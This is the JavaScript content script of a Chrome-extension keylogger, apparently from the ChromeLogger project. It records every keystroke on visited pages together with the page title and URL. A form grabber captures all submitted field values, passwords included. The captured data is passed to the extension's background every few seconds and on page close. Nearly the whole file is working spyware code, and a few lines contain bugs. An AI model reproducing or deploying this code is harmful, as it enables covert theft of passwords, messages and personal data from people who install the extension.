// source: https://github.com/Xeroday/ChromeLogger

/* Randoms */
if (!document.title) {
    document.title = document.URL;
}


// Send a message to core to indicate that the keylogger has started
const initMessage = {};
initMessage.type = 'keylogInit';
chrome.runtime.sendMessage(initMessage);
/* Keylib */
// Alphanumeric
document.addEventListener('keypress', function (e) {
    e = e || window.event;
    const charCode = typeof e.which == "number" ? e.which : e.keyCode;
    if (charCode) {
        log(String.fromCharCode(charCode));
    }
});

document.addEventListener('keydown', function (e) {
    e = e || window.event;
    const charCode = typeof e.which == "number" ? e.which : e.keyCode;
    if (charCode === 8) {
        log("[BKSP]");
    } else if (charCode === 9) {
        log("[TAB]");
    } else if (charCode === 13) {
        log("[ENTER]");
    } else if (charCode === 16) {
        log("[SHIFT]");
    } else if (charCode === 17) {
        log("[CTRL]");
    } else if (charCode === 18) {
        log("[ALT]");
    } else if (charCode === 32) {
        log(" ");
    } else if (charCode === 91) {
        log("[L WINDOW]"); // command for mac
    } else if (charCode === 92) {
        log("[R WINDOW]"); // command for mac
    } else if (charCode === 93) {
        log("[SELECT/CMD]"); // command for mac
    }
});


/* Keylog Saving */
const options = { weekday: 'narrow', year: 'numeric', month: 'short', day: 'numeric', hour: 'numeric', minute: 'numeric', second: 'numeric' };
const time = new Date().getTime().toLocaleDateString('en-US', options);
let data = {};
let shouldSave = false;
let lastLog = time;
data[time] = time + " " + document.title + "^~^" + document.URL + "^~^";

// Key'ed on JS timestamp
function log(input) {
    const now = new Date().getTime();
    if (now - lastLog < 10) return; // Remove duplicate keys (typed within 10 ms) caused by allFrames injection
    data[time] += input;
    //shouldSave = true;
    lastLog = now;
}

// Send the keylog data on window close and signal exit
window.onbeforeunload = function() {
    let keylogDataMessage = {};
    keylogDataMessage.type = "keylogData";
    keylogDataMessage.keys = data;
    chrome.runtime.sendMessage(keylogDataMessage);
    let exitMessage = {};
    initMessage.type = 'keylogExit';
    chrome.runtime.sendMessage(exitMessage);
};


// Save every second
setInterval(function(){
    if (data[time].length > 0) {
        const keyData = {};
        keyData.type = "keylogData";
        keyData.data = data[time];
        data[time] = '';
        chrome.runtime.sendMessage(keyData);
    }
}, 5000);

/* Form Grabber */
function saveForm(time, data) {
    const toSave = {};
    toSave.type = "formData";
    toSave.data = time + " [FORM_CAPTURE] " + JSON.stringify(data) + " [FORM_CAPTURE]";
    chrome.runtime.sendMessage(toSave);
}

chrome.storage.local.get(['formGrabber'], function(formCapture) {
    if (formCapture) {
        const forms = document.getElementsByTagName("form");
        for (let i = 0; i < forms.length; i++) {
            forms[i].addEventListener("submit", function(e) {
                const data = {};
                data["FormName"] = e.target.name;
                data["FormAction"] = e.target.action;
                data["FormElements"] = {};
                const elements = e.target.elements;
                for (let n = 0; n < elements.length; n++) {
                    data["FormElements"][elements[n].name] = elements[n].value;
                }
                saveForm(e.timeStamp, data);
            });
        }
    }
});